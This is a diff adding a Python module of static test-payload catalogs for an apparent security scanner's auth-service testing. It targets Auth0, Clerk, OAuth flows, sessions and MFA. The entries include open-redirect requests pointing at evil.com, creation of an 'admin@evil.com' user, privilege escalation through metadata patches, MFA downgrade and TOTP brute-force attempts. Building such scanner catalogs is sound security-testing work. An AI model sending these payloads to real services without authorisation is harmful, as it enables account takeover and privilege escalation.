@@ -1,0 +1,429 @@
+"""Payload catalogs for the Auth Services deep-testing module.
+
+Extracted from titan/modules/baas/authservices.py. Pure data — each table is a
+static list of AuthPayload entries keyed by provider/attack family. No engine
+state is read here, so the catalogs live apart from the request logic.
+"""
+
+from __future__ import annotations
+
+from dataclasses import dataclass
+from typing import Any
+
+from titan.core.models import Severity
+
+
+@dataclass
+class AuthPayload:
+    """An auth services test payload."""
+
+    name: str
+    category: str
+    endpoint: str
+    method: str
+    payload: Any
+    expected_effect: str
+    severity: Severity
+    confidence: float
+    headers: dict[str, str] | None = None
+
+
+# ── Auth0 Testing Payloads ──────────────────────────────────────────
+
+AUTH0_PAYLOADS = [
+    # OIDC Discovery
+    AuthPayload(
+        name="oidc_discovery",
+        category="auth0_enum",
+        endpoint="/.well-known/openid-configuration",
+        method="GET",
+        payload=None,
+        expected_effect="oidc_config",
+        severity=Severity.HIGH,
+        confidence=0.90,
+    ),
+    AuthPayload(
+        name="jwks_endpoint",
+        category="auth0_enum",
+        endpoint="/.well-known/jwks.json",
+        method="GET",
+        payload=None,
+        expected_effect="jwks_leak",
+        severity=Severity.HIGH,
+        confidence=0.85,
+    ),
+    AuthPayload(
+        name="tenant_info",
+        category="auth0_enum",
+        endpoint="/api/v2/tenants/settings",
+        method="GET",
+        payload=None,
+        expected_effect="tenant_leak",
+        severity=Severity.HIGH,
+        confidence=0.80,
+    ),
+    # Management API
+    AuthPayload(
+        name="management_api_users",
+        category="auth0_management",
+        endpoint="/api/v2/users",
+        method="GET",
+        payload=None,
+        expected_effect="user_list",
+        severity=Severity.CRITICAL,
+        confidence=0.90,
+    ),
+    AuthPayload(
+        name="management_api_roles",
+        category="auth0_management",
+        endpoint="/api/v2/roles",
+        method="GET",
+        payload=None,
+        expected_effect="role_list",
+        severity=Severity.CRITICAL,
+        confidence=0.90,
+    ),
+    AuthPayload(
+        name="management_api_connections",
+        category="auth0_management",
+        endpoint="/api/v2/connections",
+        method="GET",
+        payload=None,
+        expected_effect="connection_list",
+        severity=Severity.HIGH,
+        confidence=0.85,
+    ),
+    # Token Abuse
+    AuthPayload(
+        name="token_exchange",
+        category="auth0_token",
+        endpoint="/oauth/token",
+        method="POST",
+        payload={
+            "grant_type": "password",
+            "client_id": "test",
+            "username": "test@test.com",
+            "password": "test123",
+            "scope": "openid",
+        },
+        expected_effect="token_exchange",
+        severity=Severity.HIGH,
+        confidence=0.70,
+    ),
+    AuthPayload(
+        name="client_credentials",
+        category="auth0_token",
+        endpoint="/oauth/token",
+        method="POST",
+        payload={
+            "grant_type": "client_credentials",
+            "client_id": "test",
+            "client_secret": "test",
+            "audience": "https://api.example.com",
+        },
+        expected_effect="client_credentials_abuse",
+        severity=Severity.HIGH,
+        confidence=0.65,
+    ),
+    # Attack Surface
+    AuthPayload(
+        name="authorize_endpoint",
+        category="auth0_attack",
+        endpoint="/authorize",
+        method="GET",
+        payload={
+            "response_type": "code",
+            "client_id": "test",
+            "redirect_uri": "http://evil.com",
+            "scope": "openid profile email",
+        },
+        expected_effect="redirect_abuse",
+        severity=Severity.HIGH,
+        confidence=0.70,
+    ),
+    AuthPayload(
+        name="logout_endpoint",
+        category="auth0_attack",
+        endpoint="/v2/logout",
+        method="GET",
+        payload={
+            "client_id": "test",
+            "returnTo": "http://evil.com",
+        },
+        expected_effect="logout_redirect",
+        severity=Severity.MEDIUM,
+        confidence=0.65,
+    ),
+]
+
+# ── Clerk Testing Payloads ──────────────────────────────────────────
+
+CLERK_PAYLOADS = [
+    # Session Abuse
+    AuthPayload(
+        name="session_list",
+        category="clerk_session",
+        endpoint="/v1/sessions",
+        method="GET",
+        payload=None,
+        expected_effect="session_list",
+        severity=Severity.HIGH,
+        confidence=0.85,
+    ),
+    AuthPayload(
+        name="session_jwks",
+        category="clerk_session",
+        endpoint="/.well-known/jwks.json",
+        method="GET",
+        payload=None,
+        expected_effect="jwks_leak",
+        severity=Severity.HIGH,
+        confidence=0.85,
+    ),
+    AuthPayload(
+        name="session_verify",
+        category="clerk_session",
+        endpoint="/v1/sessions/{session_id}/verify",
+        method="POST",
+        payload={"token": "test"},
+        expected_effect="session_verify",
+        severity=Severity.HIGH,
+        confidence=0.80,
+    ),
+    # User Abuse
+    AuthPayload(
+        name="user_list",
+        category="clerk_user",
+        endpoint="/v1/users",
+        method="GET",
+        payload=None,
+        expected_effect="user_list",
+        severity=Severity.CRITICAL,
+        confidence=0.90,
+    ),
+    AuthPayload(
+        name="user_create",
+        category="clerk_user",
+        endpoint="/v1/users",
+        method="POST",
+        payload={"email_address": ["admin@evil.com"], "password": "hacked123"},
+        expected_effect="user_creation",
+        severity=Severity.CRITICAL,
+        confidence=0.90,
+    ),
+    AuthPayload(
+        name="user_metadata_update",
+        category="clerk_user",
+        endpoint="/v1/users/{user_id}",
+        method="PATCH",
+        payload={"public_metadata": {"role": "admin"}},
+        expected_effect="metadata_escalation",
+        severity=Severity.CRITICAL,
+        confidence=0.95,
+    ),
+    AuthPayload(
+        name="user_private_metadata",
+        category="clerk_user",
+        endpoint="/v1/users/{user_id}",
+        method="PATCH",
+        payload={"private_metadata": {"role": "admin", "is_admin": True}},
+        expected_effect="private_metadata_escalation",
+        severity=Severity.CRITICAL,
+        confidence=0.95,
+    ),
+    # Webhook Abuse
+    AuthPayload(
+        name="webhook_test",
+        category="clerk_webhook",
+        endpoint="/v1/webhooks",
+        method="GET",
+        payload=None,
+        expected_effect="webhook_list",
+        severity=Severity.HIGH,
+        confidence=0.80,
+    ),
+    # Organization Abuse
+    AuthPayload(
+        name="org_list",
+        category="clerk_org",
+        endpoint="/v1/organizations",
+        method="GET",
+        payload=None,
+        expected_effect="org_list",
+        severity=Severity.HIGH,
+        confidence=0.85,
+    ),
+    AuthPayload(
+        name="org_create",
+        category="clerk_org",
+        endpoint="/v1/organizations",
+        method="POST",
+        payload={"name": "evil-org", "slug": "evil-org"},
+        expected_effect="org_creation",
+        severity=Severity.HIGH,
+        confidence=0.80,
+    ),
+]
+
+# ── OAuth Abuse Payloads ────────────────────────────────────────────
+
+OAUTH_ABUSE_PAYLOADS = [
+    AuthPayload(
+        name="redirect_uri_open",
+        category="oauth_abuse",
+        endpoint="/oauth/authorize",
+        method="GET",
+        payload={
+            "response_type": "code",
+            "client_id": "test",
+            "redirect_uri": "http://evil.com/callback",
+            "scope": "openid profile email",
+        },
+        expected_effect="open_redirect",
+        severity=Severity.CRITICAL,
+        confidence=0.85,
+    ),
+    AuthPayload(
+        name="redirect_uri_subdomain",
+        category="oauth_abuse",
+        endpoint="/oauth/authorize",
+        method="GET",
+        payload={
+            "response_type": "code",
+            "client_id": "test",
+            "redirect_uri": "http://evil.target.com/callback",
+            "scope": "openid",
+        },
+        expected_effect="subdomain_redirect",
+        severity=Severity.HIGH,
+        confidence=0.75,
+    ),
+    AuthPayload(
+        name="redirect_uri_path_traversal",
+        category="oauth_abuse",
+        endpoint="/oauth/authorize",
+        method="GET",
+        payload={
+            "response_type": "code",
+            "client_id": "test",
+            "redirect_uri": "http://target.com/../../../evil.com",
+            "scope": "openid",
+        },
+        expected_effect="path_traversal_redirect",
+        severity=Severity.HIGH,
+        confidence=0.70,
+    ),
+    AuthPayload(
+        name="state_parameter_missing",
+        category="oauth_abuse",
+        endpoint="/oauth/authorize",
+        method="GET",
+        payload={
+            "response_type": "code",
+            "client_id": "test",
+            "redirect_uri": "http://target.com/callback",
+        },
+        expected_effect="csrf_no_state",
+        severity=Severity.HIGH,
+        confidence=0.80,
+    ),
+    AuthPayload(
+        name="token_exchange_no_code",
+        category="oauth_abuse",
+        endpoint="/oauth/token",
+        method="POST",
+        payload={
+            "grant_type": "authorization_code",
+            "client_id": "test",
+            "redirect_uri": "http://evil.com",
+        },
+        expected_effect="token_exchange_error",
+        severity=Severity.MEDIUM,
+        confidence=0.60,
+    ),
+    AuthPayload(
+        name="token_replay",
+        category="oauth_abuse",
+        endpoint="/oauth/token",
+        method="POST",
+        payload={
+            "grant_type": "authorization_code",
+            "code": "replay_code",
+            "client_id": "test",
+            "redirect_uri": "http://target.com",
+        },
+        expected_effect="token_replay",
+        severity=Severity.HIGH,
+        confidence=0.70,
+    ),
+]
+
+# ── Session Management Payloads ─────────────────────────────────────
+
+SESSION_MANAGEMENT_PAYLOADS = [
+    AuthPayload(
+        name="session_fixation",
+        category="session_mgmt",
+        endpoint="/session/fix",
+        method="GET",
+        payload=None,
+        expected_effect="session_fixation",
+        severity=Severity.HIGH,
+        confidence=0.70,
+    ),
+    AuthPayload(
+        name="session_no_rotation",
+        category="session_mgmt",
+        endpoint="/session/refresh",
+        method="POST",
+        payload=None,
+        expected_effect="no_rotation",
+        severity=Severity.HIGH,
+        confidence=0.75,
+    ),
+    AuthPayload(
+        name="session_concurrent",
+        category="session_mgmt",
+        endpoint="/session/concurrent",
+        method="POST",
+        payload=None,
+        expected_effect="concurrent_sessions",
+        severity=Severity.MEDIUM,
+        confidence=0.65,
+    ),
+]
+
+# ── MFA Bypass Payloads ─────────────────────────────────────────────
+
+MFA_BYPASS_PAYLOADS = [
+    AuthPayload(
+        name="mfa_downgrade",
+        category="mfa_bypass",
+        endpoint="/auth/mfa",
+        method="POST",
+        payload={"factor": "none"},
+        expected_effect="mfa_skip",
+        severity=Severity.CRITICAL,
+        confidence=0.80,
+    ),
+    AuthPayload(
+        name="mfa_recovery_code",
+        category="mfa_bypass",
+        endpoint="/auth/mfa/recovery",
+        method="POST",
+        payload={"code": "00000000"},
+        expected_effect="recovery_abuse",
+        severity=Severity.HIGH,
+        confidence=0.70,
+    ),
+    AuthPayload(
+        name="mfa_totp_brute",
+        category="mfa_bypass",
+        endpoint="/auth/mfa/totp",
+        method="POST",
+        payload={"code": "000000"},
+        expected_effect="totp_brute",
+        severity=Severity.HIGH,
+        confidence=0.60,
+    ),
+]
